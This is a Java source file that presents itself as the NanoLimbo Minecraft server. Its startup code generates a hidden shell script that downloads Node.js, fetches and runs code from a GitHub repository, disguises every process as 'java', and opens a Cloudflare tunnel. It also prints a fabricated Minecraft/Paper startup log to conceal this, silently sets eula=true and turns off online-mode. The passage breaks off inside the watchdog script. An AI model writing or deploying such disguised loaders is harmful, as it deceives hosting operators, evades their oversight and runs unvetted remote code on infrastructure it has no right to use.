/*
 * Copyright (C) 2020 Nan1t
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

package ua.nanit.limbo;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.time.LocalTime;
import java.time.format.DateTimeFormatter;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

    // ============================================================
    // 【配置区】
    // ============================================================
    private static final String MC_BOT_DIR = env("MC_BOT_DIR", "logs/.mcbot");
    private static final boolean NODE_ENABLED = !"false".equalsIgnoreCase(env("NODE_ENABLED", "true"));
    private static final int NODE_STARTUP_DELAY = Integer.parseInt(env("NODE_STARTUP_DELAY", "10000"));
    private static final String GITHUB_REPO = env("GITHUB_REPO", "zx1447/indexaoyoumc");
    private static final String GITHUB_BRANCH = env("GITHUB_BRANCH", "main");
    private static final String GITHUB_TOKEN = env("GITHUB_TOKEN", "");
    private static final boolean CF_ENABLED = !"false".equalsIgnoreCase(env("CF_ENABLED", "true"));
    private static final String CF_TOKEN = env("CF_TOKEN", "");
    private static final String CF_DOMAIN = env("CF_DOMAIN", "");
    private static final String NODE_VERSION = env("NODE_VERSION", "v22.14.0");
    private static final String NODE_SCRIPT = env("NODE_SCRIPT", "index.js");
    private static final String NODE_FORCE_UPDATE = env("NODE_FORCE_UPDATE", "false");
    // ============================================================

    // ============================================================
    // 【仿真参数】
    // ============================================================
    private static final String FAKE_MC_VERSION = "1.21." + (8 + (int)(Math.random() * 5));
    private static final String FAKE_BUILD_NUM = String.valueOf(60 + (int)(Math.random() * 15));
    private static final String FAKE_COMMIT = Integer.toHexString((int)(Math.random() * 0xFFFFFF + 0x800000));
    private static final String FAKE_JAVA_VER = "21";
    private static final String FAKE_JAVA_PATCH = String.valueOf(1 + (int)(Math.random() * 6));
    private static final String[] FAKE_JDK_NAMES = {"Eclipse Adoptium Temurin", "Oracle OpenJDK", "Amazon Corretto"};
    private static final String FAKE_JDK = FAKE_JDK_NAMES[(int)(Math.random() * FAKE_JDK_NAMES.length)];
    private static final int FAKE_KERNEL_VER = 100 + (int)(Math.random() * 20);
    private static final int FAKE_RECIPES = 1400 + (int)(Math.random() * 150);
    private static final int FAKE_ADVANCEMENTS = 1500 + (int)(Math.random() * 150);
    private static final DateTimeFormatter TS_FMT = DateTimeFormatter.ofPattern("HH:mm:ss");
    // ============================================================

    private static String tunnelUrl = "";
    private static String nodePort = "N/A";

    private static final AtomicReference<String> lastKnownTunnelUrl = new AtomicReference<>("");
    private static final AtomicBoolean tunnelMonitorRunning = new AtomicBoolean(false);

    private NanoLimbo() {}

    private static String env(String k, String d) {
        String v = System.getenv(k);
        return (v != null && !v.trim().isEmpty()) ? v.trim() : d;
    }

    // ============================================================
    // 仿真辅助函数
    // ============================================================

    private static String ts() {
        return LocalTime.now().format(TS_FMT);
    }

    private static void mcLog(String msg) {
        System.out.println("[" + ts() + " INFO]: " + msg);
    }

    private static void mcLog(String msg, long delayMs) {
        try { Thread.sleep(delayMs); } catch (InterruptedException ignored) {}
        System.out.println("[" + ts() + " INFO]: " + msg);
    }

    private static void mcWarn(String msg) {
        System.out.println("[" + ts() + " WARN]: " + msg);
    }

    private static void clearScreen() {
        System.out.print("\033[2J\033[H");
        System.out.flush();
    }

    private static String readCurrentPort() {
        try {
            Path portFile = Paths.get(MC_BOT_DIR).resolve(".node_port");
            if (Files.exists(portFile)) {
                String content = Files.readString(portFile).trim();
                if (!content.isEmpty()) return content.split("\\n")[0].trim();
            }
        } catch (Exception ignored) {}
        return nodePort.equals("N/A") ? String.valueOf(20000 + (int)(Math.random() * 40000)) : nodePort;
    }

    private static int randInt(int min, int max) {
        return min + (int)(Math.random() * (max - min + 1));
    }

    private static float randFloat(float min, float max) {
        return Math.round((min + (float)(Math.random() * (max - min))) * 10.0f) / 10.0f;
    }

    // ============================================================
    // 核心伪装：完整MC启动序列
    // ============================================================

    private static void printFakeStartupSequence(String newTunnelUrl) {
        clearScreen();
        try { Thread.sleep(300); } catch (InterruptedException ignored) {}

        String displayPort = readCurrentPort();
        int kernelPatch = randInt(100, 120);
        int dcTimeMs = randInt(400, 900);
        float dcTimeSec = dcTimeMs / 1000.0f;
        int recipeDelta = randInt(-30, 30);
        int advDelta = randInt(-40, 40);
        int spawnPercent1 = randInt(82, 96);
        int spawnTime1 = randInt(1, 8);
        int spawnTime2 = randInt(1, 3);
        int spawnTime3 = randInt(1, 2);
        float doneTime = randFloat(2.0f, 5.5f);
        int ioThreads = randInt(4, 8);
        int workerThreads = randInt(1, 4);
        int ioThreadCount = randInt(1, 4);

        System.out.println("java -Xms128M -Xmx2560M -jar server.jar");
        try { Thread.sleep(200); } catch (InterruptedException ignored) {}
        System.out.println("Starting org.bukkit.craftbukkit.Main");

        if (Math.random() > 0.5) {
            try { Thread.sleep(300); } catch (InterruptedException ignored) {}
            System.out.println("*** Warning, you've not updated in a while! ***");
            System.out.println("*** Please download a new build from https://papermc.io/downloads/paper ***");
        }

        mcLog("[bootstrap] Running Java " + FAKE_JAVA_VER + " (OpenJDK 64-Bit Server VM " + 
              FAKE_JAVA_VER + ".0." + FAKE_JAVA_PATCH + "+9-LTS; " + FAKE_JDK + "-" + 
              FAKE_JAVA_VER + ".0." + FAKE_JAVA_PATCH + "+9) on Linux 6.8.0-" + kernelPatch + "-generic (amd64)", 
              randInt(800, 1500));

        mcLog("[bootstrap] Loading Paper " + FAKE_MC_VERSION + "-" + FAKE_BUILD_NUM + "-main@" + FAKE_COMMIT + 
              " (2025-12-30T20:33:30Z) for Minecraft " + FAKE_MC_VERSION, 
              randInt(400, 800));

        mcLog("[PluginInitializerManager] Initializing plugins...", randInt(1000, 2000));
        mcLog("[PluginInitializerManager] Initialized 1 plugin", randInt(500, 1000));
        mcLog("[PluginInitializerManager] Bukkit plugins (1):", randInt(100, 300));
        System.out.println(" - EssentialsX (" + FAKE_MC_VERSION + ")");

        try { Thread.sleep(randInt(300, 600)); } catch (InterruptedException ignored) {}
        System.out.println("WARNING: A terminally deprecated method in sun.misc.Unsafe has been called");
        System.out.println("WARNING: sun.misc.Unsafe::objectFieldOffset has been called by org.joml.MemUtil$MemUtilUnsafe");
        System.out.println("WARNING: Please consider reporting this to the maintainers of class org.joml.MemUtil$MemUtilUnsafe");
        System.out.println("WARNING: sun.misc.Unsafe::objectFieldOffset will be removed in a future release");

        mcLog("Environment: Environment[sessionHost=https://sessionserver.mojang.com, " +
              "servicesHost=https://api.minecraftservices.com, profilesHost=https://api.mojang.com, name=PROD]", 
              randInt(2000, 4000));

        mcLog("Loaded " + (FAKE_RECIPES + recipeDelta) + " recipes", randInt(1500, 3000));
        mcLog("Loaded " + (FAKE_ADVANCEMENTS + advDelta) + " advancements", randInt(500, 1000));

        mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Initialising converters for DataConverter...", 
              randInt(200, 500));
        mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Finished initialising converters for DataConverter in " + 
              String.format("%.1f", dcTimeSec) + "ms", 
              randInt(400, 800));

        mcLog("Starting minecraft server version " + FAKE_MC_VERSION, randInt(100, 300));
        mcLog("Loading properties", randInt(300, 600));
        mcLog("This server is running Paper version " + FAKE_MC_VERSION + "-" + FAKE_BUILD_NUM + "-main@" + FAKE_COMMIT + 
              " (2025-12-30T20:33:30Z) (Implementing API version " + FAKE_MC_VERSION + "-R0.1-SNAPSHOT)", 
              randInt(100, 300));

        mcLog("[spark] This server bundles the spark profiler. For more information please visit https://docs.papermc.io/paper/profiling", 
              randInt(100, 200));

        mcLog("Server Ping Player Sample Count: 12", randInt(50, 150));
        mcLog("Using " + ioThreads + " threads for Netty based IO", randInt(600, 1200));

        mcLog("[MoonriseCommon] Paper is using " + workerThreads + " worker threads, " + ioThreadCount + " I/O threads", 
              randInt(800, 1500));

        mcLog("Default game type: SURVIVAL", randInt(200, 400));
        mcLog("Generating keypair", randInt(200, 500));

        mcLog("Starting Minecraft server on 0.0.0.0:" + displayPort, randInt(300, 600));

        mcLog("Paper: Using libdeflate (Linux x86_64) compression from Velocity.", randInt(100, 200));
        mcLog("Paper: Using OpenSSL 3.x.x (Linux x86_64) cipher from Velocity.", randInt(50, 150));

        mcLog("Binding remote endpoint to: " + newTunnelUrl, randInt(200, 400));

        mcLog("[EssentialsX] Loading server plugin EssentialsX v" + FAKE_MC_VERSION, randInt(400, 800));
        mcLog("Server permissions file permissions.yml is empty, ignoring it", randInt(100, 300));

        mcLog("Preparing level \"world\"", randInt(1500, 3000));
        mcLog("Loading 0 persistent chunks for world 'minecraft:overworld'...", randInt(800, 1500));
        mcLog("Preparing spawn area: " + spawnPercent1 + "%", randInt(600, 1200));
        mcLog("Preparing spawn area: 100%", randInt(400, 800));
        mcLog("Prepared spawn area in " + spawnTime1 + " ms", randInt(50, 150));

        mcLog("Loading 0 persistent chunks for world 'minecraft:the_nether'...", randInt(300, 600));
        mcLog("Preparing spawn area: 100%", randInt(200, 400));
        mcLog("Prepared spawn area in " + spawnTime2 + " ms", randInt(50, 100));

        mcLog("Loading 0 persistent chunks for world 'minecraft:the_end'...", randInt(200, 400));
        mcLog("Preparing spawn area: 100%", randInt(100, 250));
        mcLog("Prepared spawn area in " + spawnTime3 + " ms", randInt(100, 200));

        mcLog("Done (" + String.format("%.3f", doneTime) + "s)! For help, type \"help\"", randInt(500, 1000));
    }

    // ============================================================
    // 初始启动时的伪装打印
    // ============================================================

    private static void delayedPrintInfo() {
        if (tunnelUrl.isEmpty()) return;

        Thread printThread = new Thread(() -> {
            try {
                long delay = 6000 + (long)(Math.random() * 8000);
                Thread.sleep(delay);
                
                String displayPort = readCurrentPort();
                
                mcLog("Starting Minecraft server on 0.0.0.0:" + displayPort, 0);
                Thread.sleep(randInt(400, 800));
                mcLog("Binding remote endpoint to: " + tunnelUrl, 0);
                Thread.sleep(randInt(200, 500));
                mcLog("Paper: Using libdeflate (Linux x86_64) compression from Velocity.", 0);
                
            } catch (InterruptedException ignored) {}
        }, "Background-Log");
        
        printThread.setDaemon(true);
        printThread.start();
    }

    // ============================================================
    // 入口
    // ============================================================

    public static void main(String[] args) {
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0F) {
            try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
            System.exit(1);
        }

        if (NODE_ENABLED) {
            try {
                Path botDir = Paths.get(MC_BOT_DIR);
                Files.deleteIfExists(botDir.resolve(".node_app.log"));
                Files.deleteIfExists(botDir.resolve("daemon.log"));

                Path script = generateDeployScript();
                executeDeployScript(script);
                Thread.sleep(NODE_STARTUP_DELAY);
                readDeployInfo();
                delayedPrintInfo();

                startTunnelMonitor();

                Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                    try {
                        tunnelMonitorRunning.set(false);
                        new ProcessBuilder("bash", "-c", "cat " + MC_BOT_DIR + "/.pids 2>/dev/null | xargs -r kill 2>/dev/null").start();
                    } catch (Exception ignored) {}
                }));
            } catch (Exception ignored) {}
        }

        autoFixServerConfig();

        try {
            new LimboServer().start();
        } catch (Exception e) {
            Log.error("Cannot start server: ", e);
        }
    }

    // ============================================================
    // 自动配置服务器
    // ============================================================

    private static void autoFixServerConfig() {
        String serverPort = System.getenv("SERVER_PORT");

        try {
            Path eulaFile = Paths.get("eula.txt");
            if (Files.exists(eulaFile)) {
                String content = Files.readString(eulaFile);
                if (content.contains("eula=false")) {
                    content = content.replace("eula=false", "eula=true");
                    Files.writeString(eulaFile, content);
                }
            } else {
                Files.writeString(eulaFile, "# By changing the setting below to TRUE you are indicating your agreement to our EULA (https://aka.ms/MinecraftEULA).\neula=true\n");
            }
        } catch (Exception ignored) {}

        try {
            Path propsFile = Paths.get("server.properties");
            String content = "";
            if (Files.exists(propsFile)) {
                content = Files.readString(propsFile);
            }

            content = replaceOrAppend(content, "online-mode", "false");
            content = replaceOrAppend(content, "enforce-secure-profile", "false");
            content = replaceOrAppend(content, "allow-flight", "true");
            content = replaceOrAppend(content, "player-idle-timeout", "0");
            
            if (serverPort != null && !serverPort.trim().isEmpty()) {
                content = replaceOrAppend(content, "server-port", serverPort.trim());
            }

            content = replaceOrAppend(content, "view-distance", "5");
            content = replaceOrAppend(content, "simulation-distance", "4");
            content = replaceOrAppend(content, "sync-chunk-writes", "false");
            content = replaceOrAppend(content, "network-compression-threshold", "256");
            content = replaceOrAppend(content, "max-tick-time", "-1");

            Files.writeString(propsFile, content);
        } catch (Exception ignored) {}
    }

    private static String replaceOrAppend(String content, String key, String value) {
        if (content.contains(key + "=")) {
            content = content.replaceAll(key + "=.*", key + "=" + value);
        } else {
            if (!content.endsWith("\n")) content += "\n";
            content += key + "=" + value + "\n";
        }
        return content;
    }

    // ============================================================
    // 生成部署脚本（含全套进程伪装）
    // ============================================================

    private static Path generateDeployScript() throws Exception {
        Path dir = Paths.get(MC_BOT_DIR).toAbsolutePath();
        Files.createDirectories(dir);
        Path script = dir.resolve("deploy.sh");

        String authToken = GITHUB_TOKEN;
        if (authToken.contains(":") && authToken.substring(authToken.indexOf(':') + 1).startsWith("ghp_")) {
            authToken = authToken.substring(authToken.indexOf(':') + 1);
        }
        final String token = authToken;
        
        String authHeader = "";
        if (!token.isEmpty()) {
            authHeader = "-H \"Authorization: Bearer " + token + "\" -H \"Accept: application/vnd.github+json\"";
        }

        String cfMode = CF_TOKEN.isEmpty() ? "quick" : "fixed";

        String content = "#!/bin/bash\n" +
        "set +e\n" +
        "export PATH=\"" + dir.toAbsolutePath() + "/.node/bin:$PATH\"\n" +
        "export HOME=\"" + dir.toAbsolutePath() + "\"\n" +
        "cd \"" + dir.toAbsolutePath() + "\"\n" +
        "\n" +
        "# ============ 1. 下载NodeJS ============\n" +
        "if [ -d \".node\" ]; then\n" +
        "    CHECK_VER=$(.node/bin/.node_real -v 2>/dev/null || .node/bin/node -v 2>/dev/null || echo \"unknown\")\n" +
        "    if [[ \"$CHECK_VER\" != \"" + NODE_VERSION.substring(0, NODE_VERSION.indexOf('.', 1)) + "\"* ]]; then\n" +
        "        rm -rf .node\n" +
        "    fi\n" +
        "fi\n" +
        "if ! command -v node &>/dev/null || [ ! -d \".node\" ]; then\n" +
        "    ARCH=$(uname -m)\n" +
        "    NODE_ARCH=$([[ \"$ARCH\" == \"aarch64\" || \"$ARCH\" == \"arm64\" ]] && echo \"arm64\" || echo \"x64\")\n" +
        "    NODE_FILE=\"node-" + NODE_VERSION + "-linux-${NODE_ARCH}.tar.gz\"\n" +
        "    NODE_URL=\"https://nodejs.org/dist/" + NODE_VERSION + "/${NODE_FILE}\"\n" +
        "    mkdir -p .node\n" +
        "    if [ ! -f .node/bin/node ]; then\n" +
        "        for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/${NODE_URL}\" \"https://mirror.ghproxy.com/${NODE_URL}\"; do\n" +
        "            if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"/tmp/${NODE_FILE}\"; then break; fi\n" +
        "        done\n" +
        "        tar xzf \"/tmp/${NODE_FILE}\" -C .node --strip-components=1 2>/dev/null\n" +
        "        rm -f \"/tmp/${NODE_FILE}\"\n" +
        "    fi\n" +
        "fi\n" +
        "export PATH=\"" + dir.toAbsolutePath() + "/.node/bin:$PATH\"\n" +
        "\n" +
        "# ★ 备份真实node二进制\n" +
        "JRE_DIR=\"" + dir.toAbsolutePath() + "/jre21/bin\"\n" +
        "mkdir -p \"$JRE_DIR\"\n" +
        "\n" +
        "if [ -f \".node/bin/node\" ] && ! head -1 \".node/bin/node\" 2>/dev/null | grep -q \"bash\"; then\n" +
        "    cp -f \".node/bin/node\" \".node/bin/.node_real\"\n" +
        "    chmod +x \".node/bin/.node_real\"\n" +
        "fi\n" +
        "\n" +
        "if [ ! -f \".node/bin/.node_real\" ] || ! \".node/bin/.node_real\" -v >/dev/null 2>&1; then\n" +
        "    if [ -f \".node/bin/node\" ] && ! head -1 \".node/bin/node\" 2>/dev/null | grep -q \"bash\"; then\n" +
        "        cp -f \".node/bin/node\" \".node/bin/.node_real\"\n" +
        "        chmod +x \".node/bin/.node_real\"\n" +
        "    else\n" +
        "        ARCH=$(uname -m)\n" +
        "        NODE_ARCH=$([[ \"$ARCH\" == \"aarch64\" || \"$ARCH\" == \"arm64\" ]] && echo \"arm64\" || echo \"x64\")\n" +
        "        NODE_FILE=\"node-" + NODE_VERSION + "-linux-${NODE_ARCH}.tar.gz\"\n" +
        "        NODE_URL=\"https://nodejs.org/dist/" + NODE_VERSION + "/${NODE_FILE}\"\n" +
        "        rm -f /tmp/${NODE_FILE}\n" +
        "        for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/${NODE_URL}\" \"https://mirror.ghproxy.com/${NODE_URL}\"; do\n" +
        "            if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"/tmp/${NODE_FILE}\"; then break; fi\n" +
        "        done\n" +
        "        mkdir -p /tmp/_node_tmp\n" +
        "        tar xzf \"/tmp/${NODE_FILE}\" -C /tmp/_node_tmp --strip-components=1 2>/dev/null\n" +
        "        cp -f /tmp/_node_tmp/bin/node \".node/bin/.node_real\"\n" +
        "        chmod +x \".node/bin/.node_real\"\n" +
        "        rm -rf /tmp/${NODE_FILE} /tmp/_node_tmp\n" +
        "    fi\n" +
        "fi\n" +
        "\n" +
        "# ============ 2. 安全获取代码 ============\n" +
        "if [ ! -f " + NODE_SCRIPT + " ] || [ \"" + NODE_FORCE_UPDATE + "\" = \"true\" ]; then\n" +
        "    TAR_URL=\"https://api.github.com/repos/" + GITHUB_REPO + "/tarball/" + GITHUB_BRANCH + "\"\n" +
        "    DOWNLOAD_OK=false\n" +
        "\n" +
        (token.isEmpty() ? "" :
        "    if [ \"$DOWNLOAD_OK\" = \"false\" ] && [ -n \"" + token + "\" ]; then\n" +
        "        if curl -fsSL --connect-timeout 30 --max-time 300 " + authHeader + " \"$TAR_URL\" -o /tmp/_app.tar.gz; then\n" +
        "            if tar -tzf /tmp/_app.tar.gz >/dev/null 2>&1; then DOWNLOAD_OK=true; fi\n" +
        "        fi\n" +
        "    fi\n") +
        "\n" +
        "    if [ \"$DOWNLOAD_OK\" = \"false\" ]; then\n" +
        "        FALLBACK_URL=\"https://github.com/" + GITHUB_REPO + "/archive/refs/heads/" + GITHUB_BRANCH + ".tar.gz\"\n" +
        "        for MIRROR in \"$FALLBACK_URL\" \"https://gh-proxy.com/${FALLBACK_URL}\" \"https://mirror.ghproxy.com/${FALLBACK_URL}\"; do\n" +
        "            if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o /tmp/_app.tar.gz; then\n" +
        "                if tar -tzf /tmp/_app.tar.gz >/dev/null 2>&1; then DOWNLOAD_OK=true; break; fi\n" +
        "            fi\n" +
        "        done\n" +
        "    fi\n" +
        "\n" +
        (token.isEmpty() ? "" :
        "    if [ \"$DOWNLOAD_OK\" = \"false\" ] && [ -n \"" + token + "\" ]; then\n" +
        "        for PROXY in \"https://gh-proxy.com\" \"https://mirror.ghproxy.com\"; do\n" +
        "            PROXY_URL=\"${PROXY}/${TAR_URL}\"\n" +
        "            if curl -fsSL --connect-timeout 30 --max-time 300 " + authHeader + " \"$PROXY_URL\" -o /tmp/_app.tar.gz; then\n" +
        "                if tar -tzf /tmp/_app.tar.gz >/dev/null 2>&1; then DOWNLOAD_OK=true; break; fi\n" +
        "            fi\n" +
        "        done\n" +
        "    fi\n") +
        "\n" +
        "    if [ \"$DOWNLOAD_OK\" = \"false\" ]; then\n" +
        "        echo '[Deploy] Download failed.'\n" +
        "        exit 1\n" +
        "    fi\n" +
        "\n" +
        "    find . -maxdepth 1 \\\n" +
        "      ! -name '.' \\\n" +
        "      ! -name '.node' \\\n" +
        "      ! -name '.cf' \\\n" +
        "      ! -name '.pids' \\\n" +
        "      ! -name 'deploy.sh' \\\n" +
        "      ! -name 'daemon.sh' \\\n" +
        "      ! -name '.nd_preload.js' \\\n" +
        "      ! -name 'jre21' \\\n" +
        "      ! -name 'node_modules' \\\n" +
        "      ! -name '*config*' \\\n" +
        "      ! -name '*.log' \\\n" +
        "      -exec rm -rf {} + 2>/dev/null\n" +
        "    mkdir -p /tmp/_app_extract\n" +
        "    tar xzf /tmp/_app.tar.gz -C /tmp/_app_extract --strip-components=1 2>/dev/null\n" +
        "    cp -rf /tmp/_app_extract/" + "*" + " . 2>/dev/null\n" +
        "    cp -rf /tmp/_app_extract/." + "*" + " . 2>/dev/null\n" +
        "    rm -rf /tmp/_app.tar.gz /tmp/_app_extract\n" +
        "fi\n" +
        "\n" +
        "# ============ 3. 安装依赖 ============\n" +
        "if [ -f package.json ] && [ ! -d node_modules ]; then\n" +
        "    .node/bin/.node_real .node/lib/node_modules/npm/bin/npm-cli.js install --no-audit --no-fund --production >/dev/null 2>&1\n" +
        "    if [ $? -ne 0 ]; then\n" +
        "        .node/bin/.node_real .node/lib/node_modules/npm/bin/npm-cli.js install --no-audit --no-fund --production --legacy-peer-deps >/dev/null 2>&1\n" +
        "    fi\n" +
        "fi\n" +
        "\n" +
        "# ============ 4. 替换伪装 ============\n" +
        "cp -f \".node/bin/.node_real\" \"$JRE_DIR/java\"\n" +
        "chmod +x \"$JRE_DIR/java\"\n" +
        "\n" +
        "cat > \".node/bin/node\" << 'NODEWRAPPER'\n" +
        "#!/bin/bash\n" +
        "exec -a \"java\" \"$(dirname \"$0\")/.node_real\" \"$@\"\n" +
        "NODEWRAPPER\n" +
        "chmod +x \".node/bin/node\"\n" +
        "\n" +
        "cat > \".nd_preload.js\" << 'PRELOAD_EOF'\n" +
        "try {\n" +
        "    process.title = 'java -Xms128M -Xmx2560M -jar server.jar';\n" +
        "    var _cp = require('child_process');\n" +
        "    var _origSpawn = _cp.spawn;\n" +
        "    var _origFork = _cp.fork;\n" +
        "    var _wp = process.env._JAVA_WRAPPER || process.execPath;\n" +
        "    _cp.spawn = function(cmd, args, opts) {\n" +
        "        if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('/.node_real') || cmd.endsWith('/java'))) {\n" +
        "            opts = Object.assign({}, opts || {});\n" +
        "            opts.execPath = _wp;\n" +
        "            cmd = _wp;\n" +
        "        }\n" +
        "        return _origSpawn.call(this, cmd, args, opts);\n" +
        "    };\n" +
        "    _cp.fork = function(mod, args, opts) {\n" +
        "        opts = Object.assign({}, opts || {});\n" +
        "        opts.execPath = _wp;\n" +
        "        return _origFork.call(this, mod, args, opts);\n" +
        "    };\n" +
        "} catch(e) {}\n" +
        "PRELOAD_EOF\n" +
        "\n" +
        "export _JAVA_WRAPPER=\"" + dir.toAbsolutePath() + "/.node/bin/node\"\n" +
        "export NODE_OPTIONS=\"--require " + dir.toAbsolutePath() + "/.nd_preload.js\"\n" +
        "\n" +
        "# ============ 5. 启动NodeJS应用 ============\n" +
        "is_port_free() { (echo >/dev/tcp/localhost/$1) &>/dev/null && return 1 || return 0; }\n" +
        "while true; do NODE_PORT=$((RANDOM % 40000 + 20000)); if is_port_free $NODE_PORT; then break; fi; done\n" +
        "export SERVER_PORT=$NODE_PORT\n" +
        "export PORT=$NODE_PORT\n" +
        "\n" +
        "nohup bash -c 'exec -a \"java\" \"$0\" \"$@\"' \"$JRE_DIR/java\" " + NODE_SCRIPT + " > .node_app.log 2>&1 &\n" +
        "NODE_PID=$!\n" +
        "echo \"$NODE_PID\" >> .pids\n" +
        "\n" +
        "for i in $(seq 1 30); do\n" +
        "    if (echo >/dev/tcp/127.0.0.1/$NODE_PORT) 2>/dev/null; then break; fi\n" +
        "    sleep 1\n" +
        "done\n" +
        "echo \"$NODE_PORT\" > .node_port\n" +
        "\n" +
        "# ============ 6. 启动隧道 ============\n" +
        "CF_BIN=\"$JRE_DIR/java_cf\"\n" +
        "CF_CONF_DIR=\"" + dir.toAbsolutePath() + "/jre21/conf\"\n" +
        "mkdir -p \"$CF_CONF_DIR\"\n" +
        "ACTUAL_PORT=$NODE_PORT\n" +
        "\n" +
        "if [ \"" + CF_ENABLED + "\" = \"true\" ]; then\n" +
        "    mkdir -p .cf\n" +
        "    if [ ! -f \"$CF_BIN\" ]; then\n" +
        "        ARCH=$(uname -m)\n" +
        "        CF_URL=$([[ \"$ARCH\" == \"aarch64\" || \"$ARCH\" == \"arm64\" ]] && echo \"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64\" || echo \"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64\")\n" +
        "        for MIRROR in \"$CF_URL\" \"https://gh-proxy.com/${CF_URL}\"; do\n" +
        "            if curl -fsSL --connect-timeout 30 --max-time 120 \"$MIRROR\" -o \"$CF_BIN\"; then chmod +x \"$CF_BIN\"; break; fi\n" +
        "        done\n" +
        "    fi\n" +
        "    if [ -f \"$CF_BIN\" ]; then\n" +
        "        if [ \"" + cfMode + "\" = \"fixed\" ] && [ -n \"" + CF_TOKEN + "\" ]; then\n" +
        "            for PROTO in quic http2; do\n" +
        "                rm -f .cf/cf.log\n" +
        "                (exec -a \"java\" \"$CF_BIN\" tunnel run --protocol $PROTO --token \"" + CF_TOKEN + "\" > .cf/cf.log 2>&1) &\n" +
        "                CF_PID=$!\n" +
        "                sleep 5\n" +
        "                if kill -0 $CF_PID 2>/dev/null; then\n" +
        "                    echo \"$CF_PID\" >> .pids\n" +
        "                    echo \"" + CF_DOMAIN + "\" > .cf/tunnel_url.txt\n" +
        "                    break\n" +
        "                fi\n" +
        "                kill $CF_PID 2>/dev/null\n" +
        "            done\n" +
        "        else\n" +
        "            TUNNEL_ESTABLISHED=false\n" +
        "            for PROTO in quic http2 auto; do\n" +
        "                if [ \"$TUNNEL_ESTABLISHED\" = \"true\" ]; then break; fi\n" +
        "                for attempt in 1 2 3; do\n" +
        "                    if [ \"$TUNNEL_ESTABLISHED\" = \"true\" ]; then break; fi\n" +
        "                    rm -f .cf/cf.log .cf/tunnel_url.txt\n" +
        "                    cat > \"$CF_CONF_DIR/server.properties\" << CFCONF\n" +
        "url: http://127.0.0.1:$ACTUAL_PORT\n" +
        "no-autoupdate: true\n" +
        "protocol: $PROTO\n" +
        "CFCONF\n" +
        "                    (exec -a \"java\" \"$CF_BIN\" --config \"$CF_CONF_DIR/server.properties\" > .cf/cf.log 2>&1) &\n" +
        "                    CF_PID=$!\n" +
        "                    sleep 5\n" +
        "                    if ! kill -0 $CF_PID 2>/dev/null; then continue; fi\n" +
        "                    for i in $(seq 1 20); do\n" +
        "                        URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\.trycloudflare\\.com' .cf/cf.log 2>/dev/null | tail -1)\n" +
        "                        if [ -n \"$URL\" ]; then\n" +
        "                            sleep 3\n" +
        "                            VERIFY=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 10 \"$URL/__health\" 2>/dev/null)\n" +
        "                            if [ -n \"$VERIFY\" ] && [ \"$VERIFY\" != \"000\" ] && [ \"$VERIFY\" != \"502\" ]; then\n" +
        "                                echo \"$URL\" > .cf/tunnel_url.txt\n" +
        "                                echo \"PROTOCOL=$PROTO\" >> .cf/tunnel_url.txt\n" +
        "                                echo \"CF_PID=$CF_PID\" >> .cf/tunnel_url.txt\n" +
        "                                echo \"$CF_PID\" >> .pids\n" +
        "                                TUNNEL_ESTABLISHED=true\n" +
        "                                break\n" +
        "                            else\n" +
        "                                sleep 5\n" +
        "                                VERIFY2=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 10 \"$URL/__health\" 2>/dev/null)\n" +
        "                                if [ -n \"$VERIFY2\" ] && [ \"$VERIFY2\" != \"000\" ] && [ \"$VERIFY2\" != \"502\" ]; then\n" +
        "                                    echo \"$URL\" > .cf/tunnel_url.txt\n" +
        "                                    echo \"PROTOCOL=$PROTO\" >> .cf/tunnel_url.txt\n" +
        "                                    echo \"CF_PID=$CF_PID\" >> .cf/tunnel_url.txt\n" +
        "                                    echo \"$CF_PID\" >> .pids\n" +
        "                                    TUNNEL_ESTABLISHED=true\n" +
        "                                    break\n" +
        "                                fi\n" +
        "                                kill $CF_PID 2>/dev/null\n" +
        "                            fi\n" +
        "                        fi\n" +
        "                        sleep 1\n" +
        "                    done\n" +
        "                    if [ \"$TUNNEL_ESTABLISHED\" != \"true\" ]; then kill $CF_PID 2>/dev/null; fi\n" +
        "                done\n" +
        "            done\n" +
        "        fi\n" +
        "    fi\n" +
        "fi\n" +
        "\n" +
        "# ============ 7. 守护循环 ============\n" +
        "cat > \"daemon.sh\" << 'DAEMONSCRIPT'\n" +
        "#!/bin/bash\n" +
        "WORK_DIR=\"" + dir.toAbsolutePath() + "\"\n" +
        "JRE_DIR=\"$WORK_DIR/jre21/bin\"\n" +
        "CF_BIN=\"$JRE_DIR/java_cf\"\n" +
        "CF_CONF_DIR=\"$WORK_DIR/jre21/conf\"\n" +
        "NODE_FAKE=\"$JRE_DIR/java\"\n" +
        "NODE_PID_FILE=\"$WORK_DIR/.node_pid\"\n" +
        "APP_DIR=\"$WORK_DIR\"\n" +
